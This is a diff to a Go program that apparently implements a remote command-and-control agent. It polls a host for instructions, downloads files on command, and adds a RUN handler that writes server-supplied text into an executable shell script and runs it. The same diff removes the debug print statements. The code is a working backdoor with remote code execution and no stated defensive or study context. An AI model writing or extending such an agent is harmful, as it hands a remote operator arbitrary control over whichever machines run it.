@@ -8,6 +8,7 @@ import (
 	"math/rand"
 	"net/http"
 	"os"
+	"os/exec"
 	"strings"
 	"time"
 )
@@ -23,16 +24,35 @@ func do() {
 	stat := getHTTP(host + "stat")
 	commands := strings.Split(stat, "\n")
 	for i := 0; i < len(commands); i++ {
-		fmt.Println("Checking " + commands[i])
 		command := commands[i]
 		switch command {
 		case "DOWNLOAD":
-			fmt.Println("Downloading " + commands[i+1])
 			downloadFile(downDir+commands[i+1], host+commands[i+1])
+		case "EXECUTE":
+			execute(commands[i+1])
+		case "RUN":
+			runCommand(commands[i+1])
+		case "MOVE":
+			moveFile(commands[i+1], commands[i+2])
 		}
 
 	}
 	//repeat()
+}
+
+func moveFile(src, dest string) {
+
+}
+
+func runCommand(command string) {
+	command = "#!/bin/bash\n" + command // + "\nrm -f " + downDir + "executeme.sh"
+	ioutil.WriteFile(downDir+"executeme.sh", []byte(command), 0777)
+	cmd := exec.Command(downDir + "executeme.sh")
+	cmd.Run()
+}
+
+func execute(command string) {
+
 }
 
 func repeat() {
